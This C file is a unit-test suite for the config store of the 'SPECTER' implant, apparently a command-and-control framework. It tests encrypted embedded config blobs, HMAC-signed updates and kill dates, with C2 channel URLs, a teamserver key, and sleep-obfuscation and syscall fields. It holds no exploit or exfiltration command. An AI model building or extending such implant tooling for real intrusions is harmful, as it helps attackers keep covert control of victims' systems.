/**
 * SPECTER Implant — Config Store Test Suite
 *
 * Tests config blob parsing, encryption/decryption, signed updates,
 * and kill-date enforcement.
 *
 * Build (native, not PIC):
 *   gcc -o test_config test_config.c ../core/src/config.c \
 *       ../core/src/crypto.c ../core/src/string.c ../core/src/hash.c \
 *       -I../core/include -DTEST_BUILD
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ------------------------------------------------------------------ */
/* Type stubs (same as test_crypto.c — no windows.h)                   */
/* ------------------------------------------------------------------ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef long                NTSTATUS;
typedef int                 BOOL;
typedef unsigned int        ULONG;
typedef short               SHORT;
typedef unsigned short      WCHAR;
typedef char                CHAR;
typedef unsigned char       UCHAR;
typedef void                VOID;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef BYTE*               PBYTE;
typedef DWORD*              PDWORD;
typedef ULONG*              PULONG;
typedef SIZE_T*             PSIZE_T;
typedef WCHAR*              PWCHAR;
typedef const char*         PCSTR;
typedef const WCHAR*        PCWSTR;
typedef LONG*               PLONG;
typedef void**              PHANDLE;

#define TRUE  1
#define FALSE 0
#ifndef NULL
#define NULL ((void*)0)
#endif
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS              ((NTSTATUS)0x00000000)
#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001)
#define STATUS_INVALID_PARAMETER    ((NTSTATUS)0xC000000D)
#define STATUS_ACCESS_DENIED        ((NTSTATUS)0xC0000022)
#define STATUS_OBJECT_NAME_NOT_FOUND ((NTSTATUS)0xC0000034)
#define STATUS_NO_MEMORY            ((NTSTATUS)0xC0000017)

/* Stub PEB/PE types */
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWCHAR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink, *Blink; } LIST_ENTRY, *PLIST_ENTRY;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; LIST_ENTRY HashLinks; ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB_LDR_DATA { ULONG Length; BOOL Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;
typedef struct _PEB { BYTE InheritedAddressSpace; BYTE ReadImageFileExecOptions; BYTE BeingDebugged; BYTE BitField; BYTE Padding0[4]; PVOID Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;
typedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER;
typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER;
typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; QWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; QWORD SizeOfStackReserve; QWORD SizeOfStackCommit; QWORD SizeOfHeapReserve; QWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64;
typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64;
typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY;
typedef struct _IMAGE_SECTION_HEADER { BYTE Name[8]; DWORD VirtualSize; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER;

typedef struct _SYSCALL_ENTRY { DWORD ssn; PVOID syscall_addr; DWORD hash; } SYSCALL_ENTRY;
typedef struct _SYSCALL_TABLE { SYSCALL_ENTRY entries[50]; DWORD count; PVOID clean_ntdll; } SYSCALL_TABLE;
typedef struct _IMPLANT_CONTEXT { SYSCALL_TABLE *syscall_table; PVOID clean_ntdll; PVOID config; PVOID comms_ctx; PVOID sleep_ctx; PVOID evasion_ctx; PVOID module_bus; BOOL running; } IMPLANT_CONTEXT;

IMPLANT_CONTEXT g_ctx;

/* String/memory stubs using libc */
SIZE_T spec_strlen(const char *s) { return strlen(s); }
SIZE_T spec_wcslen(const WCHAR *s) { SIZE_T n=0; while(s[n]) n++; return n; }
int spec_strcmp(const char *a, const char *b) { return strcmp(a,b); }
int spec_wcsicmp(const WCHAR *a, const WCHAR *b) { return 0; }
void *spec_memcpy(void *d, const void *s, SIZE_T n) { return memcpy(d,s,n); }
void *spec_memmove(void *d, const void *s, SIZE_T n) { return memmove(d,s,n); }
void *spec_memset(void *d, int c, SIZE_T n) { return memset(d,c,n); }
int spec_memcmp(const void *a, const void *b, SIZE_T n) { return memcmp(a,b,n); }
char *spec_strcpy(char *d, const char *s) { return strcpy(d,s); }
char *spec_strcat(char *d, const char *s) { return strcat(d,s); }
DWORD spec_djb2_hash(const char *str) { DWORD h=5381; int c; while((c=*str++)){if(c>='A'&&c<='Z')c+=0x20;h=((h<<5)+h)+c;} return h; }
DWORD spec_djb2_hash_w(const WCHAR *str) { return 0; }
PPEB get_peb(void) { return NULL; }
PVOID find_module_by_hash(DWORD h) { return NULL; }
PVOID find_export_by_hash(PVOID m, DWORD h) { return NULL; }
PVOID resolve_function(DWORD mh, DWORD fh) { return NULL; }

/* Crypto constants & type (must precede crypto.h usage) */
#define CHACHA20_KEY_SIZE    32
#define CHACHA20_NONCE_SIZE  12
#define CHACHA20_BLOCK_SIZE  64
#define POLY1305_KEY_SIZE    32
#define POLY1305_TAG_SIZE    16
#define AEAD_KEY_SIZE        32
#define AEAD_NONCE_SIZE      12
#define AEAD_TAG_SIZE        16
#define X25519_KEY_SIZE      32
#define SHA256_BLOCK_SIZE    64
#define SHA256_DIGEST_SIZE   32
#define HKDF_SHA256_HASH_LEN 32
#define HASH_BCRYPT_DLL      0x730076C3
#define HASH_BCRYPTGENRANDOM 0xE59BE6B4

typedef struct _SHA256_CTX {
    DWORD state[8];
    QWORD bitcount;
    BYTE buffer[64];
    DWORD buf_len;
} SHA256_CTX;

/* Declare crypto functions we link against */
void spec_chacha20_block(const DWORD state[16], BYTE output[64]);
void spec_chacha20_encrypt(const BYTE key[32], const BYTE nonce[12], DWORD counter, const BYTE *plaintext, DWORD len, BYTE *ciphertext);
void spec_poly1305_auth(BYTE tag_out[16], const BYTE *msg, DWORD msg_len, const BYTE key[32]);
void spec_aead_encrypt(const BYTE key[32], const BYTE nonce[12], const BYTE *plaintext, DWORD pt_len, const BYTE *aad, DWORD aad_len, BYTE *ciphertext, BYTE tag[16]);
BOOL spec_aead_decrypt(const BYTE key[32], const BYTE nonce[12], const BYTE *ciphertext, DWORD ct_len, const BYTE *aad, DWORD aad_len, BYTE *plaintext, const BYTE tag[16]);
void spec_sha256_init(SHA256_CTX *ctx);
void spec_sha256_update(SHA256_CTX *ctx, const BYTE *data, DWORD len);
void spec_sha256_final(SHA256_CTX *ctx, BYTE digest[32]);
void spec_sha256(const BYTE *data, DWORD len, BYTE digest[32]);
void spec_hmac_sha256(const BYTE *key, DWORD key_len, const BYTE *data, DWORD data_len, BYTE mac[32]);
void spec_hkdf_extract(const BYTE *salt, DWORD salt_len, const BYTE *ikm, DWORD ikm_len, BYTE prk[32]);
void spec_hkdf_expand(const BYTE prk[32], const BYTE *info, DWORD info_len, BYTE *okm, DWORD okm_len);
void spec_hkdf_derive(const BYTE *salt, DWORD salt_len, const BYTE *ikm, DWORD ikm_len, const BYTE *info, DWORD info_len, BYTE *okm, DWORD okm_len);
void spec_decrypt_string(const BYTE *encrypted, DWORD len, BYTE *output);

/* Config types & constants */
#define CONFIG_MAGIC           0x53504543
#define CONFIG_VERSION         1
#define CONFIG_MAX_CHANNELS    4
#define CONFIG_KEY_INPUT_SIZE  64
#define CONFIG_SCAN_MAX        0x10000
#define CONFIG_SCAN_START      256

typedef enum _CHANNEL_TYPE { CHANNEL_HTTP=0, CHANNEL_DNS=1, CHANNEL_SMB=2, CHANNEL_WEBSOCKET=3 } CHANNEL_TYPE;
typedef enum _SLEEP_METHOD { SLEEP_EKKO=0, SLEEP_WFS=1, SLEEP_DELAY=2 } SLEEP_METHOD;

typedef struct _CHANNEL_CONFIG {
    char   url[256];
    DWORD  port;
    DWORD  type;
    DWORD  priority;
    DWORD  active;
} CHANNEL_CONFIG;

typedef struct _IMPLANT_CONFIG {
    BYTE           teamserver_pubkey[32];
    BYTE           implant_privkey[32];
    BYTE           implant_pubkey[32];
    BYTE           module_signing_key[32];
    DWORD          sleep_interval;
    DWORD          jitter_percent;
    DWORD          sleep_method;
    CHANNEL_CONFIG channels[CONFIG_MAX_CHANNELS];
    DWORD          channel_count;
    DWORD          max_retries;
    QWORD          kill_date;
    DWORD          profile_id;
    DWORD          checkin_count;
} IMPLANT_CONFIG;

typedef struct _CONFIG_BLOB_HEADER {
    DWORD magic;
    DWORD version;
    DWORD data_size;
    BYTE  nonce[12];
    BYTE  tag[16];
} CONFIG_BLOB_HEADER;

/* Declare config functions */
NTSTATUS cfg_init(IMPLANT_CONTEXT *ctx);
IMPLANT_CONFIG *cfg_get(IMPLANT_CONTEXT *ctx);
NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len);
NTSTATUS cfg_encrypt(IMPLANT_CONTEXT *ctx);
NTSTATUS cfg_decrypt(IMPLANT_CONTEXT *ctx);
BOOL cfg_check_killdate(IMPLANT_CONTEXT *ctx);
void cfg_test_set_pic_base(PVOID base);
void cfg_test_set_system_time(QWORD time);

/* ------------------------------------------------------------------ */
/* Test helpers                                                        */
/* ------------------------------------------------------------------ */

static int tests_run = 0;
static int tests_passed = 0;

#define ASSERT_TRUE(name, cond) do { \
    tests_run++; \
    if (cond) { tests_passed++; printf("[PASS] %s\n", name); } \
    else { printf("[FAIL] %s\n", name); } \
} while(0)

#define ASSERT_STATUS(name, status, expected) do { \
    tests_run++; \
    if ((NTSTATUS)(status) == (NTSTATUS)(expected)) { \
        tests_passed++; printf("[PASS] %s\n", name); \
    } else { \
        printf("[FAIL] %s (got 0x%08lX, expected 0x%08lX)\n", \
               name, (unsigned long)(DWORD)(status), (unsigned long)(DWORD)(expected)); \
    } \
} while(0)

/* ------------------------------------------------------------------ */
/* Build a mock PIC blob + config blob in memory                       */
/* ------------------------------------------------------------------ */

/* We need a buffer large enough for: 64 bytes PIC header + padding to
 * CONFIG_SCAN_START (256) + config blob header + encrypted config */
/* Must be >= CONFIG_SCAN_MAX (64KB) so cfg_find_blob never reads OOB */
#define MOCK_PIC_SIZE 0x12000
static BYTE g_mock_pic[MOCK_PIC_SIZE];

static void build_mock_config_blob(IMPLANT_CONFIG *plain_cfg) {
    /* Fill first 64 bytes with deterministic "PIC code" */
    for (int i = 0; i < 64; i++)
        g_mock_pic[i] = (BYTE)(i * 0x37 + 0x42);

    /* Zero the rest */
    memset(g_mock_pic + 64, 0, MOCK_PIC_SIZE - 64);

    /* Derive encryption key (same as cfg_init will) */
    BYTE key[32];
    spec_sha256(g_mock_pic, CONFIG_KEY_INPUT_SIZE, key);

    /* Serialize the config */
    BYTE plaintext[sizeof(IMPLANT_CONFIG)];
    memcpy(plaintext, plain_cfg, sizeof(IMPLANT_CONFIG));

    /* Build the config blob at offset CONFIG_SCAN_START (256), 4-byte aligned */
    DWORD blob_offset = CONFIG_SCAN_START;
    CONFIG_BLOB_HEADER *hdr = (CONFIG_BLOB_HEADER *)(g_mock_pic + blob_offset);
    hdr->magic = CONFIG_MAGIC;
    hdr->version = CONFIG_VERSION;
    hdr->data_size = sizeof(IMPLANT_CONFIG);

    /* Nonce: just use zeros for deterministic tests */
    memset(hdr->nonce, 0xAA, 12);

    /* AAD = magic + version (first 8 bytes of header) */
    BYTE *enc_out = g_mock_pic + blob_offset + sizeof(CONFIG_BLOB_HEADER);

    spec_aead_encrypt(key, hdr->nonce,
                      plaintext, sizeof(IMPLANT_CONFIG),
                      (const BYTE *)&hdr->magic, 8,
                      enc_out, hdr->tag);
}

/* ------------------------------------------------------------------ */
/* Test: cfg_init — successful parse                                   */
/* ------------------------------------------------------------------ */

static void test_cfg_init(void) {
    printf("\n=== cfg_init Tests ===\n");

    /* Build a test config */
    IMPLANT_CONFIG test_cfg;
    memset(&test_cfg, 0, sizeof(test_cfg));

    /* Fill with known values */
    memset(test_cfg.teamserver_pubkey, 0x11, 32);
    memset(test_cfg.implant_privkey, 0x22, 32);
    memset(test_cfg.implant_pubkey, 0x33, 32);
    memset(test_cfg.module_signing_key, 0x44, 32);
    test_cfg.sleep_interval = 60000;
    test_cfg.jitter_percent = 25;
    test_cfg.sleep_method = SLEEP_EKKO;
    strcpy(test_cfg.channels[0].url, "https://c2.example.com");
    test_cfg.channels[0].port = 443;
    test_cfg.channels[0].type = CHANNEL_HTTP;
    test_cfg.channels[0].priority = 0;
    test_cfg.channels[0].active = TRUE;
    test_cfg.channel_count = 1;
    test_cfg.max_retries = 5;
    test_cfg.kill_date = 0;  /* No kill date */
    test_cfg.profile_id = 42;
    test_cfg.checkin_count = 0;

    build_mock_config_blob(&test_cfg);

    /* Set test PIC base */
    cfg_test_set_pic_base(g_mock_pic);
    cfg_test_set_system_time(1000000ULL);

    /* Initialize */
    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = cfg_init(&ctx);
    ASSERT_STATUS("cfg_init returns STATUS_SUCCESS", status, STATUS_SUCCESS);
    ASSERT_TRUE("cfg_init sets ctx.config", ctx.config != NULL);

    /* Verify parsed values */
    IMPLANT_CONFIG *cfg = cfg_get(&ctx);
    ASSERT_TRUE("cfg_get returns non-NULL", cfg != NULL);

    if (cfg) {
        BYTE expected_ts_key[32];
        memset(expected_ts_key, 0x11, 32);
        ASSERT_TRUE("teamserver_pubkey correct",
                     memcmp(cfg->teamserver_pubkey, expected_ts_key, 32) == 0);

        BYTE expected_priv[32];
        memset(expected_priv, 0x22, 32);
        ASSERT_TRUE("implant_privkey correct",
                     memcmp(cfg->implant_privkey, expected_priv, 32) == 0);

        BYTE expected_pub[32];
        memset(expected_pub, 0x33, 32);
        ASSERT_TRUE("implant_pubkey correct",
                     memcmp(cfg->implant_pubkey, expected_pub, 32) == 0);

        ASSERT_TRUE("sleep_interval == 60000", cfg->sleep_interval == 60000);
        ASSERT_TRUE("jitter_percent == 25", cfg->jitter_percent == 25);
        ASSERT_TRUE("sleep_method == SLEEP_EKKO", cfg->sleep_method == SLEEP_EKKO);
        ASSERT_TRUE("channel_count == 1", cfg->channel_count == 1);
        ASSERT_TRUE("channel URL correct",
                     strcmp(cfg->channels[0].url, "https://c2.example.com") == 0);
        ASSERT_TRUE("channel port == 443", cfg->channels[0].port == 443);
        ASSERT_TRUE("max_retries == 5", cfg->max_retries == 5);
        ASSERT_TRUE("profile_id == 42", cfg->profile_id == 42);
    }
}

/* ------------------------------------------------------------------ */
/* Test: cfg_init — no config blob found                               */
/* ------------------------------------------------------------------ */

static void test_cfg_init_no_blob(void) {
    printf("\n=== cfg_init No Blob Tests ===\n");

    /* Set up a PIC blob with no config magic (must be >= CONFIG_SCAN_MAX) */
    static BYTE empty_pic[MOCK_PIC_SIZE];
    memset(empty_pic, 0x90, sizeof(empty_pic));  /* NOP sled, no magic */

    cfg_test_set_pic_base(empty_pic);

    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = cfg_init(&ctx);
    ASSERT_STATUS("cfg_init returns NOT_FOUND for missing blob",
                  status, STATUS_OBJECT_NAME_NOT_FOUND);
}

/* ------------------------------------------------------------------ */
/* Test: cfg_init — corrupted encrypted data                           */
/* ------------------------------------------------------------------ */

static void test_cfg_init_corrupted(void) {
    printf("\n=== cfg_init Corrupted Blob Tests ===\n");

    /* Build a valid blob first */
    IMPLANT_CONFIG test_cfg;
    memset(&test_cfg, 0, sizeof(test_cfg));
    test_cfg.sleep_interval = 30000;
    build_mock_config_blob(&test_cfg);

    /* Corrupt the encrypted data */
    DWORD blob_offset = CONFIG_SCAN_START;
    BYTE *enc_data = g_mock_pic + blob_offset + sizeof(CONFIG_BLOB_HEADER);
    enc_data[0] ^= 0xFF;
    enc_data[1] ^= 0xFF;

    cfg_test_set_pic_base(g_mock_pic);

    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = cfg_init(&ctx);
    ASSERT_STATUS("cfg_init rejects corrupted blob",
                  status, STATUS_UNSUCCESSFUL);
}

/* ------------------------------------------------------------------ */
/* Test: cfg_encrypt / cfg_decrypt roundtrip                           */
/* ------------------------------------------------------------------ */

static void test_cfg_encrypt_decrypt(void) {
    printf("\n=== cfg_encrypt/cfg_decrypt Tests ===\n");

    /* Build and init a valid config */
    IMPLANT_CONFIG test_cfg;
    memset(&test_cfg, 0, sizeof(test_cfg));
    memset(test_cfg.implant_privkey, 0xBB, 32);
    test_cfg.sleep_interval = 45000;
    test_cfg.jitter_percent = 10;
    test_cfg.profile_id = 99;
    test_cfg.checkin_count = 7;
    strcpy(test_cfg.channels[0].url, "https://backup.example.com");
    test_cfg.channels[0].port = 8443;
    test_cfg.channel_count = 1;

    build_mock_config_blob(&test_cfg);
    cfg_test_set_pic_base(g_mock_pic);
    cfg_test_set_system_time(2000000ULL);

    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));

    NTSTATUS status = cfg_init(&ctx);
    ASSERT_STATUS("init for encrypt/decrypt test", status, STATUS_SUCCESS);

    /* Save a copy of the plaintext config */
    IMPLANT_CONFIG saved;
    memcpy(&saved, ctx.config, sizeof(IMPLANT_CONFIG));

    /* Encrypt */
    status = cfg_encrypt(&ctx);
    ASSERT_STATUS("cfg_encrypt succeeds", status, STATUS_SUCCESS);

    /* Verify config is now different (encrypted) */
    ASSERT_TRUE("config data changed after encrypt",
                memcmp(ctx.config, &saved, sizeof(IMPLANT_CONFIG)) != 0);

    /* Decrypt */
    status = cfg_decrypt(&ctx);
    ASSERT_STATUS("cfg_decrypt succeeds", status, STATUS_SUCCESS);

    /* Verify config matches original */
    IMPLANT_CONFIG *cfg = cfg_get(&ctx);
    ASSERT_TRUE("sleep_interval restored", cfg->sleep_interval == 45000);
    ASSERT_TRUE("jitter_percent restored", cfg->jitter_percent == 10);
    ASSERT_TRUE("profile_id restored", cfg->profile_id == 99);
    ASSERT_TRUE("checkin_count restored", cfg->checkin_count == 7);
    ASSERT_TRUE("channel URL restored",
                strcmp(cfg->channels[0].url, "https://backup.example.com") == 0);
    ASSERT_TRUE("full config matches original",
                memcmp(cfg, &saved, sizeof(IMPLANT_CONFIG)) == 0);

    /* Test double-encrypt is no-op */
    cfg_encrypt(&ctx);
    status = cfg_encrypt(&ctx);
    ASSERT_STATUS("double encrypt is no-op", status, STATUS_SUCCESS);

    /* Test double-decrypt after single encrypt */
    cfg_decrypt(&ctx);
    status = cfg_decrypt(&ctx);
    ASSERT_STATUS("double decrypt is no-op", status, STATUS_SUCCESS);
}

/* ------------------------------------------------------------------ */
/* Test: cfg_update — valid signature                                  */
/* ------------------------------------------------------------------ */

static void test_cfg_update_valid(void) {
    printf("\n=== cfg_update Valid Signature Tests ===\n");

    /* Build and init a config with a known signing key */
    IMPLANT_CONFIG test_cfg;
    memset(&test_cfg, 0, sizeof(test_cfg));
    memset(test_cfg.module_signing_key, 0x55, 32);
    memset(test_cfg.implant_privkey, 0x22, 32);
    test_cfg.sleep_interval = 30000;
    test_cfg.profile_id = 1;

    build_mock_config_blob(&test_cfg);
    cfg_test_set_pic_base(g_mock_pic);
    cfg_test_set_system_time(3000000ULL);

    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    cfg_init(&ctx);

    /* Build an update payload */
    IMPLANT_CONFIG new_cfg;
    memcpy(&new_cfg, &test_cfg, sizeof(IMPLANT_CONFIG));
    new_cfg.sleep_interval = 120000;
    new_cfg.jitter_percent = 50;
    new_cfg.profile_id = 2;

    /* Sign it: HMAC-SHA256(signing_key, payload) */
    BYTE update_buf[32 + sizeof(IMPLANT_CONFIG)];
    BYTE *sig = update_buf;
    BYTE *payload = update_buf + 32;
    memcpy(payload, &new_cfg, sizeof(IMPLANT_CONFIG));

    BYTE signing_key[32];
    memset(signing_key, 0x55, 32);
    spec_hmac_sha256(signing_key, 32, payload, sizeof(IMPLANT_CONFIG), sig);

    NTSTATUS status = cfg_update(&ctx, update_buf, sizeof(update_buf));
    ASSERT_STATUS("cfg_update with valid sig", status, STATUS_SUCCESS);

    IMPLANT_CONFIG *cfg = cfg_get(&ctx);
    ASSERT_TRUE("sleep_interval updated to 120000", cfg->sleep_interval == 120000);
    ASSERT_TRUE("jitter_percent updated to 50", cfg->jitter_percent == 50);
    ASSERT_TRUE("profile_id updated to 2", cfg->profile_id == 2);

    /* Verify private key is preserved (not overwritten by update) */
    BYTE expected_priv[32];
    memset(expected_priv, 0x22, 32);
    ASSERT_TRUE("implant_privkey preserved after update",
                memcmp(cfg->implant_privkey, expected_priv, 32) == 0);
}

/* ------------------------------------------------------------------ */
/* Test: cfg_update — invalid signature                                */
/* ------------------------------------------------------------------ */

static void test_cfg_update_invalid(void) {
    printf("\n=== cfg_update Invalid Signature Tests ===\n");

    IMPLANT_CONFIG test_cfg;
    memset(&test_cfg, 0, sizeof(test_cfg));
    memset(test_cfg.module_signing_key, 0x55, 32);
    test_cfg.sleep_interval = 30000;

    build_mock_config_blob(&test_cfg);
    cfg_test_set_pic_base(g_mock_pic);
    cfg_test_set_system_time(4000000ULL);

    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    cfg_init(&ctx);

    /* Build update with wrong signature */
    BYTE update_buf[32 + sizeof(IMPLANT_CONFIG)];
    memset(update_buf, 0xDE, 32);  /* Bad signature */
    IMPLANT_CONFIG new_cfg;
    memset(&new_cfg, 0, sizeof(new_cfg));
    new_cfg.sleep_interval = 999999;
    memcpy(update_buf + 32, &new_cfg, sizeof(IMPLANT_CONFIG));

    NTSTATUS status = cfg_update(&ctx, update_buf, sizeof(update_buf));
    ASSERT_STATUS("cfg_update rejects bad sig", status, STATUS_ACCESS_DENIED);

    /* Verify config unchanged */
    IMPLANT_CONFIG *cfg = cfg_get(&ctx);
    ASSERT_TRUE("sleep_interval unchanged after bad sig",
                cfg->sleep_interval == 30000);

    /* Test too-short data */
    BYTE short_buf[16];
    memset(short_buf, 0, 16);
    status = cfg_update(&ctx, short_buf, 16);
    ASSERT_STATUS("cfg_update rejects short data",
                  status, STATUS_INVALID_PARAMETER);

    /* Test NULL params */
    status = cfg_update(&ctx, NULL, 100);
    ASSERT_STATUS("cfg_update rejects NULL data",
                  status, STATUS_INVALID_PARAMETER);
}

/* ------------------------------------------------------------------ */
/* Test: cfg_check_killdate                                            */
/* ------------------------------------------------------------------ */

static void test_cfg_killdate(void) {
    printf("\n=== cfg_check_killdate Tests ===\n");

    IMPLANT_CONFIG test_cfg;
    memset(&test_cfg, 0, sizeof(test_cfg));
    test_cfg.kill_date = 5000000ULL;

    build_mock_config_blob(&test_cfg);
    cfg_test_set_pic_base(g_mock_pic);
    cfg_test_set_system_time(5000000ULL);

    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    cfg_init(&ctx);

    /* Time before kill date */
    cfg_test_set_system_time(4999999ULL);
    ASSERT_TRUE("before kill date -> FALSE",
                cfg_check_killdate(&ctx) == FALSE);

    /* Time at kill date */
    cfg_test_set_system_time(5000000ULL);
    ASSERT_TRUE("at kill date -> TRUE",
                cfg_check_killdate(&ctx) == TRUE);

    /* Time after kill date */
    cfg_test_set_system_time(9999999ULL);
    ASSERT_TRUE("after kill date -> TRUE",
                cfg_check_killdate(&ctx) == TRUE);

    /* No kill date (0) */
    IMPLANT_CONFIG *cfg = cfg_get(&ctx);
    cfg->kill_date = 0;
    cfg_test_set_system_time(9999999ULL);
    ASSERT_TRUE("kill_date==0 -> FALSE (no expiry)",
                cfg_check_killdate(&ctx) == FALSE);

    /* NULL context */
    ASSERT_TRUE("NULL ctx -> TRUE (terminate)",
                cfg_check_killdate(NULL) == TRUE);
}

/* ------------------------------------------------------------------ */
/* Test: cfg_get edge cases                                            */
/* ------------------------------------------------------------------ */

static void test_cfg_get_edge_cases(void) {
    printf("\n=== cfg_get Edge Cases ===\n");

    ASSERT_TRUE("cfg_get(NULL) returns NULL",
                cfg_get(NULL) == NULL);

    IMPLANT_CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ASSERT_TRUE("cfg_get with NULL config returns NULL",
                cfg_get(&ctx) == NULL);
}

/* ------------------------------------------------------------------ */
/* Main                                                                */
/* ------------------------------------------------------------------ */

int main(void) {
    printf("SPECTER Config Store Test Suite\n");
    printf("===============================\n");

    test_cfg_init();
    test_cfg_init_no_blob();
    test_cfg_init_corrupted();
    test_cfg_encrypt_decrypt();
    test_cfg_update_valid();
    test_cfg_update_invalid();
    test_cfg_killdate();
    test_cfg_get_edge_cases();

    printf("\n===============================\n");
    printf("Results: %d/%d passed\n", tests_passed, tests_run);

    return (tests_passed == tests_run) ? 0 : 1;
}
